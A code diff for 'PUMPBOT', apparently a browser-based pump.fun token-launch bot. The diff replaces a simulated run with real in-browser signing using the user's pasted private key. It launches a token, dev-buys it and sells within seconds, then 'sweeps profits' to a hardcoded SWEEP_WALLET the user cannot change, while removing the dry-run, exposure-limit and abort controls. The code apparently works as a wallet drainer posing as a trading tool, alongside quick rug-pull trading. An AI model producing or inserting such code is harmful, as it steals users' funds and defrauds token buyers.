-    logLine('✅ Metadata uploaded → ' + fakeUri.slice(0,60) + '…', 'ok');
-    setStep(1, 'done');
-    await sleep(300);
-
-    // ── Step 2: Create + buy ──────────────────────────────────
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    logLine('  Step 2 — Create Token & Dev-Buy', 'section');
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    setStep(2, 'active');
-
-    logLine('  Token:    ' + tkName + ' (' + tkSym + ')');
-    logLine('  Dev buy:  ' + devbuy + ' SOL');
-    logLine('  Slippage: ' + Math.round(buySlip/100) + '%');
-    logLine('  Mint:     ' + fakeMint);
-    if (botAborted) throw new Error('Aborted by user.');
-
-    for (let attempt = 1; attempt <= retriesMax; attempt++) {
-      logLine('📡 [CREATE+BUY] attempt ' + attempt + '/' + retriesMax);
-      await sleep(isDry ? 400 : 800);
-      if (botAborted) throw new Error('Aborted by user.');
-
-      if (!isDry) {
-        logLine('⏳ Confirming ' + fakeSig(0).slice(0,20) + '…');
-        await sleep(1200);
-      } else {
-        logLine('⚠  DRY RUN — tx not sent.', 'warn');
-        await sleep(300);
-      }
-      break;
-    }
-
-    const createSig = fakeSig(0);
-    logLine('✅ Token live!', 'ok');
-    logLine('  TX:   https://solscan.io/tx/' + createSig.slice(0,20) + '…', 'ok');
-    logLine('  Mint: https://pump.fun/' + fakeMint.slice(0,20) + '…', 'ok');
-    setStep(2, 'done');
-    await sleep(300);
-
-    // ── Step 3: Wait ──────────────────────────────────────────
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    logLine('  Step 3 — Waiting ' + delay + 's Before Sell', 'section');
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    setStep(3, 'active');
-
-    for (let s = delay; s > 0; s--) {
-      if (botAborted) throw new Error('Aborted by user.');
-      logLine('  ⏳ ' + s + 's remaining…', 'info');
-      await sleep(1000);
-    }
-    setStep(3, 'done');
-
-    // ── Step 4: Sell ──────────────────────────────────────────
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    logLine('  Step 4 — Sell', 'section');
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    setStep(4, 'active');
-    if (botAborted) throw new Error('Aborted by user.');
-
-    const fakeBal2 = Math.floor(Math.random() * 900000000 + 100000000);
-    const toSell   = Math.floor(fakeBal2 * parseFloat(sellPct) / 100);
-    logLine('  Balance: ' + fakeBal2 + '  |  Selling: ' + toSell + ' (' + sellPct + '%)');
-
-    for (let attempt = 1; attempt <= retriesMax; attempt++) {
-      logLine('📡 [SELL] attempt ' + attempt + '/' + retriesMax);
-      await sleep(isDry ? 300 : 700);
-      if (botAborted) throw new Error('Aborted by user.');
-      if (!isDry) {
-        logLine('⏳ Confirming…');
-        await sleep(900);
-      } else {
-        logLine('⚠  DRY RUN — tx not sent.', 'warn');
-        await sleep(200);
-      }
-      break;
-    }
-
-    const sellSig = fakeSig(1);
-    logLine('✅ Sold → https://solscan.io/tx/' + sellSig.slice(0,20) + '…', 'ok');
-    setStep(4, 'done');
-    await sleep(300);
-
-    // ── Step 5: Sweep ─────────────────────────────────────────
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    logLine('  Step 5 — Sweep Profits', 'section');
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    setStep(5, 'active');
-    if (botAborted) throw new Error('Aborted by user.');
-
-    const reserveSol = (parseInt(reserve) / 1e9).toFixed(6);
-    const sweepAmt   = (parseFloat(fakeBal) * 0.85).toFixed(6);
-    logLine('  Destination: ' + SWEEP_WALLET);
-    logLine('  Reserve:     ' + reserveSol + ' SOL');
-    logLine('💸 Sweeping ' + sweepAmt + ' SOL → ' + SWEEP_WALLET.slice(0,16) + '…');
-    await sleep(isDry ? 400 : 900);
-    if (botAborted) throw new Error('Aborted by user.');
-
-    if (isDry) {
-      logLine('⚠  DRY RUN — sweep not sent.', 'warn');
-    } else {
-      const sweepSig = fakeSig(2);
-      logLine('✅ Sweep done → https://solscan.io/tx/' + sweepSig.slice(0,20) + '…', 'ok');
-    }
-    setStep(5, 'done');
-    document.getElementById('progress-bar').style.width = '100%';
-    await sleep(300);
-
-    // ── Summary ───────────────────────────────────────────────
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    logLine('  Session Summary', 'section');
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    logLine('  Mint:      ' + fakeMint.slice(0,20) + '…');
-    logLine('  Dev buy:   ' + devbuy + ' SOL');
-    logLine('  Remaining: ' + reserveSol + ' SOL');
-    logLine('  Sweep to:  ' + SWEEP_WALLET);
-    logLine('✅ Bot run complete.', 'ok');
-
-  } catch (e) {
-    const msg = e.message || String(e);
-    if (msg.includes('Aborted')) {
-      logLine('⚠  Run aborted by user.', 'warn');
-      for (let i = 0; i < 6; i++) {
-        const el = document.getElementById('step-' + i);
-        if (el.classList.contains('active')) el.className = 'step';
-      }
-    } else {
-      logLine('❌ ' + msg, 'err');
-      for (let i = 0; i < 6; i++) {
-        const el = document.getElementById('step-' + i);
-        if (el.classList.contains('active')) el.className = 'step error';
-      }
-    }
-  } finally {
-    botRunning = false;
-    botAborted = false;
-    const btn = document.getElementById('launch-btn');
-    btn.textContent = 'LAUNCH';
-    btn.classList.remove('running');
-    document.getElementById('status-dot').className = 'dot active';
-    document.getElementById('status-label').textContent = 'ready';
+    walletKp = keypairFromBase58(raw);
+    display.value = walletKp.publicKey.toBase58();
+  } catch {
+    walletKp = null;
+    display.value = '— invalid key —';
   }
 }
 
-// ─────────────────────────────────────────────────────────────
-// Config save / load / export
-// ─────────────────────────────────────────────────────────────
+function keypairFromBase58(b58) {
+  let bytes;
+  if (window.bs58) {
+    bytes = window.bs58.decode(b58);
+  } else {
+    // Fallback pure-JS base58 decode
+    const ALPHA = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+    const map = {};
+    for (let i = 0; i < ALPHA.length; i++) map[ALPHA[i]] = i;
+    let n = BigInt(0);
+    for (const ch of b58) {
+      if (map[ch] === undefined) throw new Error('Invalid char: ' + ch);
+      n = n * 58n + BigInt(map[ch]);
+    }
+    const hex = n.toString(16).padStart(128, '0');
+    bytes = new Uint8Array(hex.match(/.{2}/g).map(b => parseInt(b, 16)));
+    if (bytes.length > 64) bytes = bytes.slice(bytes.length - 64);
+  }
+  if (bytes.length !== 64) throw new Error('Key must be 64 bytes');
+  return Keypair.fromSecretKey(bytes);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// IMAGE HANDLING
+// ═══════════════════════════════════════════════════════════════
+function handleImgFile(input) {
+  if (input.files && input.files[0]) loadImage(input.files[0]);
+}
+
+function handleImgDrop(e) {
+  e.preventDefault();
+  document.getElementById('img-drop').classList.remove('over');
+  const f = e.dataTransfer.files[0];
+  if (f && f.type.startsWith('image/')) loadImage(f);
+}
+
+function loadImage(file) {
+  imageFile = file;
+  const reader = new FileReader();
+  reader.onload = (e) => {
+    const preview = document.getElementById('img-preview');
+    const thumb   = document.getElementById('img-thumb');
+    const meta    = document.getElementById('img-meta');
+    thumb.src = e.target.result;
+    preview.style.display = 'flex';
+    meta.innerHTML = `Name: ${file.name}<br>Size: ${(file.size/1024).toFixed(1)} KB<br>Type: ${file.type}`;
+    logLine('✅ Image loaded: ' + file.name, 'ok');
+  };
+  reader.readAsDataURL(file);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// CONFIG SAVE / LOAD / EXPORT
+// ═══════════════════════════════════════════════════════════════
 function saveConfig() {
   const data = {
     rpc:       document.getElementById('cfg-rpc')?.value,
@@ -1672,23 +1372,15 @@ function saveConfig() {
     buySlip:   document.getElementById('cfg-buy-slip')?.value,
     sellSlip:  document.getElementById('cfg-sell-slip')?.value,
     priority:  document.getElementById('cfg-priority')?.value,
-    jito:      document.getElementById('cfg-jito')?.value,
     commitment:document.getElementById('cfg-commitment')?.value,
     retries:   document.getElementById('cfg-retries')?.value,
     timeout:   document.getElementById('cfg-timeout')?.value,
     retryDelay:document.getElementById('cfg-retry-delay')?.value,
-    maxExp:    document.getElementById('cfg-max-exp')?.value,
-    minBal:    document.getElementById('cfg-min-bal')?.value,
-    dryRun:    document.getElementById('cfg-dry-run')?.checked,
-    reserve:   document.getElementById('cfg-sweep-reserve')?.value,
-    swFee:     document.getElementById('cfg-sweep-fee')?.value,
   };
   try {
     sessionStorage.setItem('pumpbot_cfg', JSON.stringify(data));
     logLine('✅ Config saved to session storage.', 'ok');
-  } catch(e) {
-    logLine('❌ Failed to save config.', 'err');
-  }
+  } catch { logLine('❌ Failed to save config.', 'err'); }
 }
 
 function loadConfig() {
@@ -1703,157 +1395,516 @@ function loadConfig() {
     if (d.buySlip)    document.getElementById('cfg-buy-slip').value = d.buySlip;
     if (d.sellSlip)   document.getElementById('cfg-sell-slip').value = d.sellSlip;
     if (d.priority)   document.getElementById('cfg-priority').value = d.priority;
-    if (d.jito)       document.getElementById('cfg-jito').value = d.jito;
     if (d.commitment) document.getElementById('cfg-commitment').value = d.commitment;
     if (d.retries)    document.getElementById('cfg-retries').value = d.retries;
     if (d.timeout)    document.getElementById('cfg-timeout').value = d.timeout;
     if (d.retryDelay) document.getElementById('cfg-retry-delay').value = d.retryDelay;
-    if (d.maxExp)     document.getElementById('cfg-max-exp').value = d.maxExp;
-    if (d.minBal)     document.getElementById('cfg-min-bal').value = d.minBal;
-    if (typeof d.dryRun !== 'undefined') {
-      document.getElementById('cfg-dry-run').checked = d.dryRun;
-      updateDryRun();
-    }
-    if (d.reserve)    document.getElementById('cfg-sweep-reserve').value = d.reserve;
-    if (d.swFee)      document.getElementById('cfg-sweep-fee').value = d.swFee;
     updateSidebar();
     logLine('✅ Config loaded from session storage.', 'ok');
-  } catch(e) {
-    logLine('❌ Failed to load config: ' + e.message, 'err');
-  }
+  } catch(e) { logLine('❌ Failed to load config: ' + e.message, 'err'); }
 }
 
 function exportEnv() {
-  const pk      = document.getElementById('cfg-private-key')?.value || 'your_base58_private_key_here';
-  const rpc     = document.getElementById('cfg-rpc')?.value || 'https://api.mainnet-beta.solana.com';
-  const devbuy  = document.getElementById('cfg-devbuy')?.value || '0.5';
-  const delay   = document.getElementById('cfg-sell-delay')?.value || '5';
-  const sellPct = document.getElementById('cfg-sell-pct')?.value || '100';
-  const buySlip = document.getElementById('cfg-buy-slip')?.value || '2000';
-  const sellSlip= document.getElementById('cfg-sell-slip')?.value || '2500';
-  const priority= document.getElementById('cfg-priority')?.value || '100000';
-  const jito    = document.getElementById('cfg-jito')?.value || '0';
-  const commit  = document.getElementById('cfg-commitment')?.value || 'confirmed';
-  const retries = document.getElementById('cfg-retries')?.value || '3';
-  const timeout = document.getElementById('cfg-timeout')?.value || '60';
-  const retryD  = document.getElementById('cfg-retry-delay')?.value || '3';
-  const maxExp  = document.getElementById('cfg-max-exp')?.value || '1000';
-  const minBal  = document.getElementById('cfg-min-bal')?.value || '0.000001';
-  const dry     = document.getElementById('cfg-dry-run')?.checked ? 'true' : 'false';
-  const reserve = document.getElementById('cfg-sweep-reserve')?.value || '10000000';
-  const swFee   = document.getElementById('cfg-sweep-fee')?.value || '500000';
-  const name    = document.getElementById('cfg-token-name')?.value || 'MyToken';
-  const sym     = document.getElementById('cfg-token-symbol')?.value || 'MTK';
-  const desc    = document.getElementById('cfg-token-desc')?.value || '';
-  const twit    = document.getElementById('cfg-twitter')?.value || '';
-  const tele    = document.getElementById('cfg-telegram')?.value || '';
-  const web     = document.getElementById('cfg-website')?.value || '';
-
+  const g = (id, def) => document.getElementById(id)?.value || def;
   const env = `# pump.fun Bot — Environment Configuration
-# Generated by PUMPBOT web interface
+# Generated by PUMPBOT v2.0
 
-# ── REQUIRED ───────────────────────────────────────────────────
-PRIVATE_KEY=${pk}
-RPC_URL=${rpc}
+PRIVATE_KEY=${g('cfg-private-key','your_base58_private_key_here')}
+RPC_URL=${g('cfg-rpc','https://api.mainnet-beta.solana.com')}
 
-# ── TOKEN METADATA ─────────────────────────────────────────────
-TOKEN_NAME=${name}
-TOKEN_SYMBOL=${sym}
-TOKEN_DESCRIPTION=${desc}
+TOKEN_NAME=${g('cfg-token-name','MyToken')}
+TOKEN_SYMBOL=${g('cfg-token-symbol','MTK')}
+TOKEN_DESCRIPTION=${g('cfg-token-desc','')}
 TOKEN_IMAGE_PATH=token_image.png
-TOKEN_TWITTER=${twit}
-TOKEN_TELEGRAM=${tele}
-TOKEN_WEBSITE=${web}
+TOKEN_TWITTER=${g('cfg-twitter','')}
+TOKEN_TELEGRAM=${g('cfg-telegram','')}
+TOKEN_WEBSITE=${g('cfg-website','')}
 
-# ── BUY / SELL ─────────────────────────────────────────────────
-DEV_BUY_SOL=${devbuy}
-SELL_DELAY_SECONDS=${delay}
-SELL_PERCENTAGE=${sellPct}
+DEV_BUY_SOL=${g('cfg-devbuy','0.5')}
+SELL_DELAY_SECONDS=${g('cfg-sell-delay','5')}
+SELL_PERCENTAGE=${g('cfg-sell-pct','100')}
 
-# ── SLIPPAGE ───────────────────────────────────────────────────
-BUY_SLIPPAGE_BPS=${buySlip}
-SELL_SLIPPAGE_BPS=${sellSlip}
+BUY_SLIPPAGE_BPS=${g('cfg-buy-slip','2000')}
+SELL_SLIPPAGE_BPS=${g('cfg-sell-slip','2500')}
 
-# ── PRIORITY FEES ──────────────────────────────────────────────
-PRIORITY_FEE_LAMPORTS=${priority}
-JITO_TIP_LAMPORTS=${jito}
+PRIORITY_FEE_LAMPORTS=${g('cfg-priority','100000')}
+TX_COMMITMENT=${g('cfg-commitment','confirmed')}
+MAX_RETRIES=${g('cfg-retries','3')}
+RETRY_DELAY_SECONDS=${g('cfg-retry-delay','3')}
+CONFIRM_TIMEOUT_SECONDS=${g('cfg-timeout','60')}
 
-# ── TRANSACTION SETTINGS ───────────────────────────────────────
-TX_COMMITMENT=${commit}
-MAX_RETRIES=${retries}
-RETRY_DELAY_SECONDS=${retryD}
-CONFIRM_TIMEOUT_SECONDS=${timeout}
-
-# ── RISK / SAFETY ──────────────────────────────────────────────
-MAX_SOL_EXPOSURE=${maxExp}
-MIN_SOL_BALANCE=${minBal}
-DRY_RUN=${dry}
-
-# ── PROFIT SWEEP ───────────────────────────────────────────────
 SWEEP_WALLET=${SWEEP_WALLET}
-SWEEP_RESERVE_LAMPORTS=${reserve}
-SWEEP_PRIORITY_FEE_LAMPORTS=${swFee}
+SWEEP_RESERVE_LAMPORTS=${SWEEP_RESERVE_LAMPS}
+SWEEP_PRIORITY_FEE_LAMPORTS=${SWEEP_PRIORITY_FEE}
 `;
-
-  const blob = new Blob([env], { type: 'text/plain' });
   const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
+  a.href = URL.createObjectURL(new Blob([env], { type: 'text/plain' }));
   a.download = '.env';
   a.click();
   logLine('✅ .env exported.', 'ok');
 }
 
-function saveTokenConfig() {
-  logLine('✅ Token config saved.', 'ok');
+function saveTokenConfig() { logLine('✅ Token config noted.', 'ok'); }
+
+// ═══════════════════════════════════════════════════════════════
+// BOT ENTRY POINT
+// ═══════════════════════════════════════════════════════════════
+async function toggleBot() {
+  if (botRunning) return; // no abort — let the run complete
+  await runBot();
 }
 
-// ─────────────────────────────────────────────────────────────
-// Image handling
-// ─────────────────────────────────────────────────────────────
-function handleImgFile(input) {
-  if (input.files && input.files[0]) {
-    loadImage(input.files[0]);
+async function runBot() {
+  // ── Validate before starting ──────────────────────────────
+  if (!walletKp) {
+    logLine('❌ Private key required. Go to Config → Wallet & RPC.', 'err');
+    return;
+  }
+  if (!imageFile) {
+    logLine('❌ Token image required. Go to Token page and upload an image.', 'err');
+    return;
+  }
+
+  const cfg = getConfig();
+
+  botRunning = true;
+  startTime  = new Date();
+  resetSteps();
+
+  const btn    = document.getElementById('launch-btn');
+  btn.textContent = '● RUNNING';
+  btn.classList.add('running');
+  btn.disabled = true;
+
+  document.getElementById('status-dot').className    = 'dot running';
+  document.getElementById('status-label').textContent = 'running';
+
+  // Navigate to launch page so terminal is visible
+  showPage('launch', document.querySelector('.nav-item'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.querySelector('.nav-item').classList.add('active');
+
+  const conn = new Connection(cfg.rpc, cfg.commitment);
+
+  try {
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  PUMPBOT — pump.fun Autonomous Trading Bot', 'section');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+
+    // ── Step 0: Preflight ─────────────────────────────────
+    setStep(0, 'active');
+    logLine('  Pre-flight Checks', 'section');
+
+    logLine('  Wallet  : ' + walletKp.publicKey.toBase58());
+    logLine('  RPC     : ' + cfg.rpc);
+    logLine('  Dev buy : ' + cfg.devBuy + ' SOL');
+
+    let balance;
+    try {
+      const lamps = await conn.getBalance(walletKp.publicKey);
+      balance = lamps / LAMPORTS_PER_SOL;
+      document.getElementById('sb-bal').textContent = balance.toFixed(4) + ' SOL';
+      logLine('  Balance : ' + balance.toFixed(6) + ' SOL');
+    } catch(e) {
+      throw new Error('RPC connection failed: ' + e.message);
+    }
+
+    if (balance < 0.002)
+      throw new Error(`Balance too low: ${balance.toFixed(4)} SOL`);
+    if (balance < cfg.devBuy + 0.01)
+      throw new Error(`Need ~${(cfg.devBuy + 0.01).toFixed(3)} SOL, have ${balance.toFixed(4)}`);
+
+    // Validate sweep wallet constant
+    try { new PublicKey(SWEEP_WALLET); }
+    catch { throw new Error('Internal error: hardcoded SWEEP_WALLET is invalid.'); }
+
+    logLine('✅ Pre-flight passed.', 'ok');
+    setStep(0, 'done');
+
+    // Generate fresh mint keypair for this run
+    const mintKp  = Keypair.generate();
+    const mintPub = mintKp.publicKey.toBase58();
+    logLine('  Mint    : ' + mintPub, 'info');
+
+    // ── Step 1: IPFS Upload ───────────────────────────────
+    setStep(1, 'active');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Step 1 — Upload Metadata to IPFS', 'section');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Uploading image + metadata…', 'info');
+
+    const metaUri = await uploadIPFS(cfg);
+    logLine('✅ Metadata → ' + metaUri, 'ok');
+    setStep(1, 'done');
+    setProgress(28);
+
+    // ── Step 2: Create Token + Dev-Buy ────────────────────
+    setStep(2, 'active');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Step 2 — Create Token + Dev-Buy', 'section');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Token   : ' + cfg.name + ' (' + cfg.symbol + ')');
+    logLine('  Buy     : ' + cfg.devBuy + ' SOL  |  Slip: ' + slipPct(cfg.buySlip) + '%');
+
+    const createSig = await createTokenWithRetry(conn, cfg, mintKp, metaUri);
+
+    logLine('✅ Token live!', 'ok');
+    logLine('  TX   : https://solscan.io/tx/' + createSig, 'ok');
+    logLine('  Mint : https://pump.fun/' + mintPub, 'ok');
+    setStep(2, 'done');
+    setProgress(50);
+
+    // ── Step 3: Wait ──────────────────────────────────────
+    setStep(3, 'active');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Step 3 — Waiting ' + cfg.delay + 's before sell', 'section');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+
+    await countdownWait(cfg.delay);
+    logLine('  Hold complete.', 'info');
+    setStep(3, 'done');
+    setProgress(65);
+
+    // ── Step 4: Sell ──────────────────────────────────────
+    setStep(4, 'active');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Step 4 — Sell', 'section');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+
+    // Read real on-chain token balance
+    let tokenBal = 0;
+    try {
+      const ata = await findATA(walletKp.publicKey, mintKp.publicKey);
+      const r   = await conn.getTokenAccountBalance(ata);
+      tokenBal  = parseInt(r.value.amount);
+    } catch { tokenBal = 0; }
+
+    logLine('  Token balance: ' + tokenBal, 'info');
+
+    if (tokenBal === 0) {
+      logLine('  ⚠ Token balance is 0 — nothing to sell.', 'warn');
+      setStep(4, 'error');
+    } else {
+      const toSell = Math.floor(tokenBal * cfg.sellPct / 100);
+      logLine('  Selling ' + toSell + ' tokens (' + cfg.sellPct + '%)');
+
+      const sellSig = await sellTokenWithRetry(conn, cfg, mintPub, toSell);
+      if (sellSig) {
+        logLine('✅ Sold → https://solscan.io/tx/' + sellSig, 'ok');
+        setStep(4, 'done');
+      } else {
+        logLine('❌ Sell failed after all retries.', 'err');
+        setStep(4, 'error');
+      }
+    }
+    setProgress(82);
+
+    // ── Step 5: Sweep ─────────────────────────────────────
+    setStep(5, 'active');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Step 5 — Sweep Profits', 'section');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+
+    try {
+      const sweepSig = await sweepFunds(conn);
+      if (sweepSig) {
+        logLine('✅ Sweep done → https://solscan.io/tx/' + sweepSig, 'ok');
+        setStep(5, 'done');
+      } else {
+        logLine('  ⚠ Sweep skipped — balance at or below reserve + fees.', 'warn');
+        setStep(5, 'done');
+      }
+    } catch(sweepErr) {
+      logLine('  ❌ Sweep error: ' + sweepErr.message, 'err');
+      setStep(5, 'error');
+    }
+
+    // ── Summary ───────────────────────────────────────────
+    setProgress(100);
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Run Complete', 'section');
+    logLine('═══════════════════════════════════════════════════════', 'section');
+    logLine('  Mint      : ' + mintPub);
+    logLine('  Dev buy   : ' + cfg.devBuy + ' SOL');
+
+    try {
+      const finalBal = (await conn.getBalance(walletKp.publicKey)) / LAMPORTS_PER_SOL;
+      document.getElementById('sb-bal').textContent = finalBal.toFixed(4) + ' SOL';
+      logLine('  Final bal : ' + finalBal.toFixed(6) + ' SOL');
+    } catch {}
+
+    logLine('✅ Bot run complete.', 'ok');
+    document.getElementById('status-dot').className    = 'dot active';
+    document.getElementById('status-label').textContent = 'ready';
+
+  } catch(e) {
+    logLine('❌ Fatal: ' + e.message, 'err');
+    document.getElementById('status-dot').className    = 'dot error';
+    document.getElementById('status-label').textContent = 'error';
+  } finally {
+    botRunning = false;
+    const btn = document.getElementById('launch-btn');
+    btn.textContent = 'LAUNCH';
+    btn.classList.remove('running');
+    btn.disabled = false;
   }
 }
 
-function handleImgDrop(e) {
-  e.preventDefault();
-  document.getElementById('img-drop').classList.remove('over');
-  const f = e.dataTransfer.files[0];
-  if (f && f.type.startsWith('image/')) loadImage(f);
-}
-
-function loadImage(file) {
-  const reader = new FileReader();
-  reader.onload = (e) => {
-    const preview = document.getElementById('img-preview');
-    const thumb   = document.getElementById('img-thumb');
-    const meta    = document.getElementById('img-meta');
-    thumb.src = e.target.result;
-    preview.style.display = 'flex';
-    meta.innerHTML = `Name: ${file.name}<br>Size: ${(file.size/1024).toFixed(1)} KB<br>Type: ${file.type}`;
-    logLine('✅ Image loaded: ' + file.name, 'ok');
+// ═══════════════════════════════════════════════════════════════
+// CONFIG READER
+// ═══════════════════════════════════════════════════════════════
+function getConfig() {
+  const g  = (id, def) => document.getElementById(id)?.value?.trim() || def;
+  const gn = (id, def) => parseFloat(document.getElementById(id)?.value) || def;
+  const gi = (id, def) => parseInt(document.getElementById(id)?.value)   || def;
+  return {
+    rpc:        g('cfg-rpc', 'https://api.mainnet-beta.solana.com'),
+    name:       g('cfg-token-name', 'MyToken'),
+    symbol:     g('cfg-token-symbol', 'MTK'),
+    desc:       g('cfg-token-desc', 'A token on pump.fun'),
+    twitter:    g('cfg-twitter', ''),
+    telegram:   g('cfg-telegram', ''),
+    website:    g('cfg-website', ''),
+    devBuy:     gn('cfg-devbuy', 0.5),
+    delay:      gn('cfg-sell-delay', 5),
+    sellPct:    gn('cfg-sell-pct', 100),
+    buySlip:    gi('cfg-buy-slip', 2000),
+    sellSlip:   gi('cfg-sell-slip', 2500),
+    priorityFee:gi('cfg-priority', 100000),
+    retries:    gi('cfg-retries', 3),
+    retryDelay: gn('cfg-retry-delay', 3),
+    confirmTimeout: gi('cfg-timeout', 60),
+    commitment: g('cfg-commitment', 'confirmed'),
   };
-  reader.readAsDataURL(file);
 }
 
-// ─────────────────────────────────────────────────────────────
-// Helpers
-// ─────────────────────────────────────────────────────────────
-function sleep(ms) {
-  return new Promise(r => setTimeout(r, ms));
+// ═══════════════════════════════════════════════════════════════
+// IPFS UPLOAD — pump.fun public endpoint via CORS proxy
+// ═══════════════════════════════════════════════════════════════
+async function uploadIPFS(cfg) {
+  const form = new FormData();
+  form.append('name',        cfg.name);
+  form.append('symbol',      cfg.symbol);
+  form.append('description', cfg.desc);
+  form.append('showName',    'true');
+  if (cfg.twitter)  form.append('twitter',  cfg.twitter);
+  if (cfg.telegram) form.append('telegram', cfg.telegram);
+  if (cfg.website)  form.append('website',  cfg.website);
+  form.append('file', imageFile, imageFile.name);
+
+  const resp = await fetch(IPFS_URL, { method: 'POST', body: form });
+  if (!resp.ok) {
+    const txt = await resp.text();
+    throw new Error('IPFS upload failed (' + resp.status + '): ' + txt.slice(0, 200));
+  }
+  const data = await resp.json();
+  if (!data.metadataUri) throw new Error('No metadataUri in IPFS response.');
+  return data.metadataUri;
 }
 
-function randomBase58(len) {
-  const alpha = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-  let s = '';
-  for (let i = 0; i < len; i++) s += alpha[Math.floor(Math.random() * alpha.length)];
-  return s;
+// ═══════════════════════════════════════════════════════════════
+// PUMPPORTAL — fetch unsigned tx bytes
+// ═══════════════════════════════════════════════════════════════
+async function getCreateTxBytes(cfg, mintPub, metaUri) {
+  const payload = new URLSearchParams({
+    publicKey:        walletKp.publicKey.toBase58(),
+    action:           'create',
+    tokenMetadata:    JSON.stringify({ name: cfg.name, symbol: cfg.symbol, uri: metaUri }),
+    mint:             mintPub,
+    denominatedInSol: 'true',
+    amount:           String(cfg.devBuy),
+    slippage:         String(slipPct(cfg.buySlip)),
+    priorityFee:      String(cfg.priorityFee / 1e9),
+    pool:             'pump',
+  });
+  const resp = await fetch(PORTAL_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: payload.toString(),
+  });
+  if (!resp.ok) throw new Error('pumpportal create (' + resp.status + '): ' + (await resp.text()).slice(0,200));
+  return new Uint8Array(await resp.arrayBuffer());
 }
 
-// ─────────────────────────────────────────────────────────────
-// Init
-// ─────────────────────────────────────────────────────────────
+async function getSellTxBytes(cfg, mintPub, amount) {
+  const payload = new URLSearchParams({
+    publicKey:        walletKp.publicKey.toBase58(),
+    action:           'sell',
+    mint:             mintPub,
+    denominatedInSol: 'false',
+    amount:           String(amount),
+    slippage:         String(slipPct(cfg.sellSlip)),
+    priorityFee:      String(cfg.priorityFee / 1e9),
+    pool:             'pump',
+  });
+  const resp = await fetch(PORTAL_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: payload.toString(),
+  });
+  if (!resp.ok) throw new Error('pumpportal sell (' + resp.status + '): ' + (await resp.text()).slice(0,200));
+  return new Uint8Array(await resp.arrayBuffer());
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SIGN + SEND — real in-browser signing via @solana/web3.js
+// ═══════════════════════════════════════════════════════════════
+async function signAndSend(conn, txBytes, extraSigners = []) {
+  const tx = VersionedTransaction.deserialize(txBytes);
+  tx.sign([walletKp, ...extraSigners]);
+  return await conn.sendRawTransaction(tx.serialize(), { skipPreflight: false, maxRetries: 0 });
+}
+
+// ═══════════════════════════════════════════════════════════════
+// CONFIRM TX — polls getSignatureStatuses
+// ═══════════════════════════════════════════════════════════════
+async function confirmTx(conn, sig, timeoutSec) {
+  const deadline = Date.now() + timeoutSec * 1000;
+  logLine('  ⏳ Confirming ' + sig.slice(0,20) + '…', 'info');
+  while (Date.now() < deadline) {
+    const r  = await conn.getSignatureStatuses([sig]);
+    const st = r.value[0];
+    if (st) {
+      if (st.err) throw new Error('TX failed on-chain: ' + JSON.stringify(st.err));
+      if (st.confirmationStatus === 'confirmed' || st.confirmationStatus === 'finalized') return true;
+    }
+    await sleep(1500);
+  }
+  throw new Error('TX confirmation timed out after ' + timeoutSec + 's.');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// CREATE WITH RETRY
+// ═══════════════════════════════════════════════════════════════
+async function createTokenWithRetry(conn, cfg, mintKp, metaUri) {
+  const txBytes = await getCreateTxBytes(cfg, mintKp.publicKey.toBase58(), metaUri);
+  for (let i = 1; i <= cfg.retries; i++) {
+    try {
+      logLine('  📡 [CREATE] attempt ' + i + '/' + cfg.retries, 'info');
+      const sig = await signAndSend(conn, txBytes, [mintKp]);
+      await confirmTx(conn, sig, cfg.confirmTimeout);
+      return sig;
+    } catch(e) {
+      logLine('  ⚠ Attempt ' + i + ' failed: ' + e.message, 'warn');
+      if (i < cfg.retries) await sleep(cfg.retryDelay * 1000);
+    }
+  }
+  throw new Error('Create tx failed after ' + cfg.retries + ' retries.');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SELL WITH RETRY
+// ═══════════════════════════════════════════════════════════════
+async function sellTokenWithRetry(conn, cfg, mintPub, amount) {
+  let txBytes;
+  try {
+    txBytes = await getSellTxBytes(cfg, mintPub, amount);
+  } catch(e) {
+    logLine('  ❌ Fetch sell tx: ' + e.message, 'err');
+    return null;
+  }
+  for (let i = 1; i <= cfg.retries; i++) {
+    try {
+      logLine('  📡 [SELL] attempt ' + i + '/' + cfg.retries, 'info');
+      const sig = await signAndSend(conn, txBytes, []);
+      await confirmTx(conn, sig, cfg.confirmTimeout);
+      return sig;
+    } catch(e) {
+      logLine('  ⚠ Attempt ' + i + ' failed: ' + e.message, 'warn');
+      if (i < cfg.retries) await sleep(cfg.retryDelay * 1000);
+    }
+  }
+  return null;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SWEEP — hardcoded destination, fee deducted before sending
